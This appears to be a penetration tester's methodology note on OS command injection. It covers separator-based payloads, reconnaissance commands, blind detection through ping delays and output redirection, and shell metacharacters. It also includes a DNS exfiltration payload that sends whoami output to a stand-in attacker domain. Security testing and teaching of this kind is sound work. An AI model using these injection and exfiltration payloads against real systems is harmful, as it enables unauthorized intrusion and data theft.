# Methodology

#COMMANDINJECTION 
#METHODOLOGY 
<hr>

Test request parameters appending commands with command separator characters and look for the application output for any hint that a OS command was executed. Have in mind that all commands are system dependent.

Test the vulnerability as follows:

1. Inject simple commands in parameters with command separators. It may be necessary to URL encode the payload.

`parameter1=value&parameter2=URLEncode(& whoami &)`

## Useful commands

Purpose of command | Linux | Windows
---------------|-------|------------
Name of current user |`whoami`|`whoami`
Operating system | `uname -a` | `ver`
Network configuration | `ifconfig` | `ipconfig /all`
Network connections | `netstat -an` | `netstat -an`
Running processes | `ps -ef` |`tasklist`

<hr>

## Blind command injection

### Time delays

Injected commands can be used to cause time delays in the server response, test request parameters with:

`& ping -c 10 127.0.0.1 &`

And look for delays in the application's responses.

### Redirecting output

Inject a command, then redirect it's output to a file, place it a location in which it can be retrieved with the browser, depending on wether the application serves static resources or not. Use a payload like:

`& whoami > /var/www/static/whoami.txt &`

(the payload above assumes that the web application uses the system location `/var/www/static` to retieve resources and also that the server runs Linux OS)

<hr>

## OAST techniques

### DNS lookup

`& nslookup kgji2ohoyw.web-attacker.com &`

The `nslookup` command causes a DNS lookup for the specified domain. So that he attacker can confirm that the command was executed by the server.

### Data exfiltration
``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &``

This will cause a DNS lookup to the attacker's domain containing the result of the `whoami` command:

`wwwuser.kgji2ohoyw.web-attacker.com`

<hr>

## Ways to inject commands

Useful shell metacharacters to inject commands.

Metacharacters | Unix | Windows
---------------|-------|------------
Name of current user |[x]|[x]
`&`| [x]| [x]
`&&` |[x]|[x]
\| |[x]|[x]
\|\| |[x]|[x]
`;` |[x]|[]
`Newline (0x0a or \n)` |[x]|[]
\`injected command\`  |[x]|[]
$(injected command)  |[x]|[]
